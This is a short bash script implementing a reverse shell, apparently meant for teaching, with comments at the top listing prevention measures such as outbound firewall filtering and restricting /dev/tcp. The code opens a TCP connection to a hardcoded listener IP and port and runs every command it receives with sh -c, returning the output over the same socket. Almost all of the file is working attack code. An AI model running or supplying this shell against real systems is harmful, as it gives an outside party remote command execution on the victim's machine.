#############################################
# PREVENTION
# Outbound firewall filtering
# Block unknown external connections
# Restrict /dev/tcp usage
# Monitor unusual network processes
#############################################
# Listener IP and port
IP="10.10.10.10"
PORT="6767"
#############################################
# Open TCP connection
exec 5<>/dev/tcp/$IP/$PORT
#############################################
# Receive and execute commands
cat <&5 | while read -r cmd
do
    sh -c "$cmd" 2>&5 >&5
done
#############################################
